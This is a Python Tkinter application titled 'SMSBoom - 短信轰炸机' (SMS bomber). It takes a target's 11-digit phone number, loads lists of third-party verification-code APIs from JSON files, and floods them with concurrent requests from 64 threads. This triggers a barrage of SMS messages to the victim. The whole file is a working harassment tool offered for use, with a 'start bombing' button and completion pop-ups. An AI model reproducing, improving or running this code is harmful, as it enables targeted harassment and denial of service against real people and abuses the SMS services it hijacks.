from tkinter import Tk, StringVar, messagebox
from tkinter import ttk
import threading
import json
import pathlib
import sys
import os
import httpx
import time
from typing import List, Union
from concurrent.futures import ThreadPoolExecutor

# 确定应用程序是一个脚本文件或冻结EXE
if getattr(sys, 'frozen', False):
    path = os.path.dirname(sys.executable)
elif __file__:
    path = os.path.dirname(__file__)

def load_json() -> List[dict]:
    """load json file"""
    json_path = pathlib.Path(path, "api.json")
    if not json_path.exists():
        raise ValueError
    with open(json_path.absolute(), mode="r", encoding="utf8") as j:
        try:
            return json.loads(j.read())
        except json.decoder.JSONDecodeError:
            raise ValueError

def load_getapi() -> List[str]:
    """load GETAPI file"""
    json_path = pathlib.Path(path, "GETAPI.json")
    if not json_path.exists():
        raise ValueError
    with open(json_path.absolute(), mode="r", encoding="utf8") as j:
        try:
            return json.loads(j.read())
        except json.decoder.JSONDecodeError:
            raise ValueError

def reqFunc(api: dict, phone: Union[str, tuple]):
    """请求接口方法"""
    try:
        with httpx.Client(verify=False, timeout=10) as client:
            if api["method"] == "GET":
                r = client.get(
                    api["url"].replace("[phone]", phone), headers=api.get("header", {}))
            else:
                r = client.post(
                    api["url"],
                    headers=api.get("header", {}),
                    data={k: v.replace("[phone]", phone) if isinstance(
                        v, str) else v for k, v in api["data"].items()})
    except Exception as why:
        pass

class InputWidget(ttk.Frame):
    """输入框,确认框"""

    def __init__(self, parent=None):
        ttk.Frame.__init__(self, parent)
        self.parent = parent
        self.columnconfigure(0, weight=1)
        self.rowconfigure(0, weight=1)
        self.phone = StringVar()
        self.createWidget()

        for child in self.winfo_children(): 
            child.grid_configure(padx=5, pady=5)

        self.pack()

    def start_bombing(self):
        """启动轰炸"""
        phone = self.phone.get()
        if not phone or not phone.isdigit() or len(phone) != 11:
            messagebox.showerror("错误", "请输入正确的11位手机号!")
            return
            
        try:
            _api = load_json()
            _api_get = load_getapi()
        except ValueError:
            messagebox.showerror("错误", "无法读取接口文件,请确保api.json和GETAPI.json存在且格式正确!")
            return

        def bombing():
            with ThreadPoolExecutor(max_workers=64) as pool:
                for api in _api:
                    pool.submit(reqFunc, api, phone)
                for api_get in _api_get:
                    pool.submit(reqFunc, {"url": api_get, "method": "GET"}, phone)
            messagebox.showinfo("完成", "轰炸完成!")

        threading.Thread(target=bombing, daemon=True).start()
        messagebox.showinfo("提示", "轰炸已开始,请等待完成提示!")

    def createWidget(self):
        """InputWidget"""
        ttk.Label(self, text="手机号:").grid(column=0, row=0, sticky='nsew')
        ttk.Entry(self, textvariable=self.phone).grid(
            column=1, row=0, columnspan=3, sticky='nsew')
        ttk.Button(self, text="启动轰炸", command=self.start_bombing).grid(
            column=4, row=0, sticky='nsew')


class Application(ttk.Frame):
    """APP main frame"""

    def __init__(self, parent=None):
        ttk.Frame.__init__(self, parent)
        self.parent = parent
        # 伸缩
        self.columnconfigure(0, weight=1)
        self.rowconfigure(0, weight=1)
        self.createWidget()
        # 间隔
        for child in self.winfo_children(): 
            child.grid_configure(padx=5, pady=5)

        self.pack()

    def createWidget(self):
        """Widget"""
        input_wiget = InputWidget(self)


if __name__ == "__main__":
    root = Tk()
    root.title("SMSBoom - 短信轰炸机 ©落落")
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    Application(parent=root)
    root.mainloop()
